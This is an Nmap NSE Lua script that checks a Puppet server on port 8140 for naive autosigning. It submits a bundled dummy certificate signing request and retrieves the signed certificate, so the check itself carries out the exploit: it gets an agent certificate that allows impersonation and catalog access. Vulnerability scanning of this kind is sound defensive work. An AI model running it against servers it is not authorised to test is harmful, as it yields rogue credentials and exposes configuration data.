local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"
local vulns = require "vulns"
local table = require "table"
local io = require "io"

description = [[
Detects if naive signing is enabled on a Puppet server. This enables attackers
to create any Certificate Signing Request and have it signed, allowing them
to impersonate as a puppet agent. This can leak the configuration of the agents
as well as any other sensitive information found in the configuration files.

This script makes use of the Puppet HTTP API interface to sign the request.

Tested on versions 3.8.5, 4.10, however the certificate does not return in the
same PUT request for version 4.10.

References:
* https://docs.puppet.com/puppet/4.10/ssl_autosign.html#security-implications-of-nave-autosigning
]]

---
-- @usage nmap -p 8140 --script puppet-naivesigning <target>
--
-- @output
-- PORT     STATE SERVICE REASON
-- 8140/tcp open  puppet  syn-ack ttl 64
-- | puppet-naivesigning:
-- |   VULNERABLE:
-- |   Puppet Naive autosigning enabled!
-- |     State: VULNERABLE
-- |       Naive autosigning causes the Puppet CA to autosign ALL CSRs. Attackers will be able to obtain a configuration catalog, which might contain sensitive information.
-- |
-- |     Extra information:
-- |       -----BEGIN CERTIFICATE-----
-- |   MIIEPTCCAiWgAwIBAgIBDDANBgkqhkiG9w0BAQsFADAoMSYwJAYDVQQDDB1QdXBw
-- |   ZXQgQ0E6IHVidW50dS5sb2NhbGRvbWFpbjAeFw0xNzA2MjMyMTMzMTdaFw0yMjA2
-- |   MjMyMTMzMTdaMGMxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIEwZMb25kb24xDzANBgNV
-- |   BAcTBkxvbmRvbjEhMB8GA1UEChMYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMQ8w
-- |   DQYDVQQDEwZhZ2VuY3kwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMUgqxSl
-- |   Co1RhT7kNIhjPZmSsPeLDiIBqIaqxx++N5D747CHd3d/EJPh/tQ21X+Nm0GNFpAF
-- |   XMDQ6pgZ8dJTrUNKHhp228JSRY4al6/IxRJYz63PUtvyCCCw3/xXmFsPZUYjlS6F
-- |   OmXwiAX6ur+A+Cl97rUWzqBCzcgXk+lQNbnzAgMBAAGjgbowgbcwNQYJYIZIAYb4
-- |   QgENBChQdXBwZXQgUnVieS9PcGVuU1NMIEludGVybmFsIENlcnRpZmljYXRlMA4G
-- |   A1UdDwEB/wQEAwIFoDAgBgNVHSUBAf8EFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIw
-- |   DAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUWOuZxF8f5zG08o8Vxxw//Ev8oTowHwYD
-- |   VR0jBBgwFoAUVAOu7b1ebCy4YvgFEW9XmU0O7dMwDQYJKoZIhvcNAQELBQADggIB
-- |   AFq3uAcCQcfG0oSl94IJSibdAsBHq4Li0GKgiemWypg0t2TVTf7yrdws5wXdh708
-- |   aFGXXdoY/T8uwNsfZ+wvY5TAiuwYYFuiYFihBRt54aVgAkUc0Zw83AYa8awnugD+
-- |   KcXGEV9MMf7EljYAf04U/TuB5D7yP0+i/Bax2Oonvh3ye21Z6gt886MtlqJBu6QC
-- |   7nSNB+U8NNm6OVez+1HbHVlCWykRSbzJJFa5w9lDEq2X1DHCepUtQwTOSLt8aCa4
-- |   guaFTeAgeIeZeG3V65Dl4DtuQAE6B9We7CBt4NNhRVw9Ho8qiRpoprwu9fQCa7up
-- |   d/bghpEghnlKAMkCrJh1c/KCxpRaiOOwCjKXkwunvtpalOj0VLsmU8/bBZRHgAEy
-- |   k97juRzBcCkRnHz2i4Dx8JDGGt1HCOOx7gY2yyQy19bAubIbxfV/GT2JnFs7S2Ue
-- |   XjwcX7OCvs2HO5Fonbd3XfQZ3edOrMgOgho6tFbrnMPtYC8QFlQC9aCRRi2SWknR
-- |   8eb2qLkhJ2tQS7wcoViExaNkJIkl9N7OMAlpf2UeKtXY2GERTtQKwtZdfmmxPyzC
-- |   cWmPBtJPGXBv4XjEHgLr4dVEzfJ7hOmScG+f0mbedmj2Q/UaOUxr2sOhWJ9hHwjP
-- |   GzRUe6rBqQTYLfgQlZFsv579UWxao7sLnY31A1R/8JTJ
-- |_  -----END CERTIFICATE-----
--
-- @xmloutput
-- <table key="NMAP-1">
-- <elem key="title">Puppet Naive autosigning enabled!</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="description">
-- <elem>Naive autosigning causes the Puppet CA to autosign ALL CSRs. Attackers will be able to obtain a configuration catalog, which might contain sensitive information.&#xa;</elem>
-- </table>
-- <table key="extra_info">
-- <elem>-&#45;&#45;&#45;&#45;BEGIN CERTIFICATE-&#45;&#45;&#45;&#45;&#xa;MIIEPTCCAiWgAwIBAgIBDjANBgkqhkiG9w0BAQsFADAoMSYwJAYDVQQDDB1QdXBw&#xa;ZXQgQ0E6IHVidW50dS5sb2NhbGRvbWFpbjAeFw0xNzA2MjMyMTUwNDNaFw0yMjA2&#xa;MjMyMTUwNDNaMGMxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIEwZMb25kb24xDzANBgNV&#xa;BAcTBkxvbmRvbjEhMB8GA1UEChMYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMQ8w&#xa;DQYDVQQDEwZhZ2VuY3kwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMUgqxSl&#xa;Co1RhT7kNIhjPZmSsPeLDiIBqIaqxx++N5D747CHd3d/EJPh/tQ21X+Nm0GNFpAF&#xa;XMDQ6pgZ8dJTrUNKHhp228JSRY4al6/IxRJYz63PUtvyCCCw3/xXmFsPZUYjlS6F&#xa;OmXwiAX6ur+A+Cl97rUWzqBCzcgXk+lQNbnzAgMBAAGjgbowgbcwNQYJYIZIAYb4&#xa;QgENBChQdXBwZXQgUnVieS9PcGVuU1NMIEludGVybmFsIENlcnRpZmljYXRlMA4G&#xa;A1UdDwEB/wQEAwIFoDAgBgNVHSUBAf8EFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIw&#xa;DAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUWOuZxF8f5zG08o8Vxxw//Ev8oTowHwYD&#xa;VR0jBBgwFoAUVAOu7b1ebCy4YvgFEW9XmU0O7dMwDQYJKoZIhvcNAQELBQADggIB&#xa;ALfpFcl9eBrtGOG5/PKIRlCjubY+tPrO99YgUmKLULiOowYQM94b9iySescaD6LI&#xa;hPhdksA4StOZWqwdUVmWOwSO9rreDv00aeYIt/yPCodopjX8jTsqCK5xNcApe5op&#xa;zpax530E5PYkJBtji/l92tFy638y+Ze4tJJBzARjSSUgrTp4GLgM0NzV3fwTCVsw&#xa;f2SfQxTPQk/AmS7KSBywruaLrAACOsx9Yw7RUAqDy6WFh/mxCur+RH1YvPh+O3Ok&#xa;03ZN21K34mSZkGcO7mIfVBMugh7u65QExrOvCSjNXhdZt6qjJp22rFguyoJ24sWQ&#xa;fa4IFRNY9vQn75mVIanKrXlp3ocGJ+sKQIrTQkvXfB3ODKAbqnqHAOCmxjNgS8M4&#xa;gBYREfFeOYirQT8Fc8PDiGoZpTTQZEJ6KLMXUg9KUesR6v3vMXEuC3Vmm3HW88/B&#xa;+BuCYnkItJuh4LhYuZqGUcbIQWQlg8V35p9xVwdeH0rtpx/s9keuLV/PP2EuLQWD&#xa;QgD2NDB1yuOr1Ti0eebVCp4D3Gx/E98TJce0hm0a2lOz2q0/iLun5+RJgrRUX1b3&#xa;qwQlWzg3rR6Q7HK85GCyy8/2EO9NMeGnhYtKgW7m4tbuxdlTSKcikUk4GOl0FlCa&#xa;TOpB8yAEoBBf0p0OVpptKLeyALLaRI+txO/YV/HMeY0y&#xa;-&#45;&#45;&#45;&#45;END CERTIFICATE-&#45;&#45;&#45;&#45;&#xa;</elem>
-- </table>
-- </table>
--
---

author = "Wong Wai Tuck"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}

portrule = shortport.port_or_service( {8140} , "puppet", "tcp", "open")

-- dummy certificate signing request to sign
-- note that replacing the requested node name from the CSR doesn't work
-- you have to generate a new CSR 
local DUMMY_CSR= [[
-----BEGIN CERTIFICATE REQUEST-----
MIIEZTCCAk0CAQAwIDEeMBwGA1UEAwwVYWdlbnR6ZXJvLmxvY2FsZG9tYWluMIIC
IjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAu1nXwvGCczXPa/6gQupULuVM
DoSunzhb0NRXQXmRGUqv3dJU+ktQ+laqIAle45zFg7HpiVGNCPs7ZrE/dfKaa+Tg
sIgu+qLLHTo5l9+qhVVJUu3/YrU8RfdW6LrYGKEVqyC8QA71naJq/5jhETEmhpWL
geZg0vpxkGhaC78WGe09oKRNEWkTLi/RjNCmY+1emjMXpwx3rrj1wyinI6b4dXmc
RvdPFX8D9H1R8ihGEasPQNbGqzRmLt2slGstdyKWj1UKDkmDqfiuLNxRbHm7a8b5
BTb4CpYQ88cmdU6Q8RM7+NnFzavlwrWQYxqxK0RlZZDEwCLxdrnETS72tVG9RT8v
oELQNlgYLdFiEL02XjiDYK8p7dEtlh4+Om8XJDxx+F1Ycom1ygU+NHMgQrIZWyPJ
73V4pm6QApcn0oQ54wYBkr/k8NjCkZOuKv4VQ4MKknvO8gotYsRzGUbDpJ2HzG1U
VRm9ShiDKXpJ7S7ZG07owAk1XxKkBCSembzzQzivPVPJb7IQTogpe3oc4hKO1cbH
rPBSreg6jOqVhClkWP5havq82AHM1K1ZyCiHNzBCnyxb/G1QkiKGhhXMarRKIQPQ
szPeLdxXPVDZ0Rmri6vFdDSuGmOkPyFaEJEhIscF0dSKeBvSwIkN0LmeLU/PXi9N
66ybzjmG9h8SLOCOGjECAwEAAaAAMA0GCSqGSIb3DQEBCwUAA4ICAQBQUG/A+RA3
2fMZTTPb12Dcz9vB09WIynoyd6t0zuaumQEYutR4G0uGNkKwQiFe+oVc2GtoCnr2
MCk1QXEjWYXORDabPzDT+o68CJfzJClPeoKeXCthq1MyGpxgKLRQUoCKJdRVbFoc
WOpgt5T1LzII2UqMSDZuVuKwnvMxc7cTe9TJyBdxS23Ol/Y2GQx+qA6aUeMHUvin
5UwdrOtLdRcPsPfdUtU0VbsObnvLC82knzXT9Ck5sRW6r4MI6C9EQ40ff2LMFvyM
1N0ITTd65NxUe2f4fyfdZ0t/Hd2w5aEbomrkswCEmFaY753cKic+bxVXXFlTNRuI
/39gMwqXf0RQ2bHilEsMVSIzI8K6QV8p3rg+CnZn/a1sSRx+fLfZjEMNV4X/CXzj
YB4XG8QPnbEO3LZ6gts17TxI7LYOd51svgJj5NMZ6sPbQswPqWzit/M8jf2JJESk
CoRHtg9HU+CXNAODAzeh+JoMX41HGKi2lA3xfcIAN1+oojQheJj5A/+X1rpBS7zG
kvIyTFQh1G40rgeSwxUXNxNogKPcF80bJz5BHKaw09qo2rmGw1FeNXwOgzmgCd3Y
zUdrhHojoA2wRsT3zGiXjct8VKVydnRoFRHHoZTQXk6sR81pgV0XiA23pB42dOqZ
L3Gga99UTASI0PZ/dEQA2sooKhIt7pCDMw==
-----END CERTIFICATE REQUEST-----
]]
local DEFAULT_NODE = "agentzero.localdomain"
local DEFAULT_ENV = "production"

-- different versions have different paths to the certificate signing endpoint
local PATHS = {
  v3='/%s/certificate_request/%s', -- version 3.8
  v4='/puppet-ca/v1/certificate_request/%s?environment=%s' -- version 4.10
}

action = function(host, port)
  local vuln_table = {
    title = "Puppet Naive autosigning enabled!",
    state = vulns.STATE.NOT_VULN,
    description = [[
Naive autosigning causes the Puppet CA to autosign ALL CSRs. Attackers will be able to obtain a configuration catalog, which might contain sensitive information.
]],
    extra_info = {}
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local options = {}
  options['header'] = {}

  -- parse args
  local node = stdnse.get_script_args(SCRIPT_NAME .. ".node") or DEFAULT_NODE
  local env = stdnse.get_script_args(SCRIPT_NAME .. "env") or DEFAULT_ENV

  local csr_file = stdnse.get_script_args(SCRIPT_NAME .. ".csr")
  local csr
  stdnse.debug1("File: ", csr_file)

  -- load the custom csr if it is provided
  if csr_file then
    local csr_h = io.open(csr_file, "r")
    csr = csr_h:read("*all")
    stdnse.debug1(csr)
    if (not(csr)) or not(string.match(csr, "BEGIN CERTIFICATE REQUEST")) then
      stdnse.debug1("Couldn't load CSR %s", csr_file)
    end
    csr_h.close()
  else
    csr = DUMMY_CSR
  end

  stdnse.debug1("CSR: %s", csr)

  -- set acceptable API response to s, so response is returned
  -- see https://github.com/puppetlabs/puppet/blob/master/api/docs/http_certificate_request.md#supported-response-formats
  options['header']['Accept'] = 's'

  -- set content-type to text/plain so the CSR can be deserialized
  -- see https://docs.puppet.com/puppet/3.8/http_api/http_certificate_request.html
  options['header']['Content-Type'] = 'text/plain'

  for version, path in pairs(PATHS) do
    if version == "v3" then
      path = string.format(path, env, node)
    elseif version == "v4" then
      path = string.format(path, node, env)
    end

    stdnse.debug1("Path: %s", path)
    local response = http.put(host, port, path, options, csr)
    stdnse.debug1("Status of CSR: %s", response.status)
    stdnse.debug2("Response for CSR: %s", response.body)
    -- 200 means it worked
    if response.status == 200 then
      if response.body == "" then
        --likely version 4.10, so have to get the cert out from searching
        local get_cert_path = string.format("/puppet-ca/v1/certificate/%s?environment=%s", node, env)
        local get_cert_response = http.get(host, port, get_cert_path, options)
        response = get_cert_response
        stdnse.debug2("Response for Get Cert: %s", get_cert_response.body)
      end

      if http.response_contains(response, "BEGIN CERTIFICATE") then
        vuln_table.state = vulns.STATE.VULN
        table.insert(vuln_table.extra_info, response.body)
        break
      end
    elseif http.response_contains(response, "has a signed certificate; ignoring certificate request") then
      stdnse.debug1("it should come here")
      vuln_table.state = vulns.STATE.VULN
      local get_cert_path = string.format("/%s/certificate/%s", env, node)
      local get_cert_response = http.get(host, port, get_cert_path, options)
      table.insert(vuln_table.extra_info, get_cert_response.body)
      break
    end
  end
  return vuln_report:make_output(vuln_table)
end
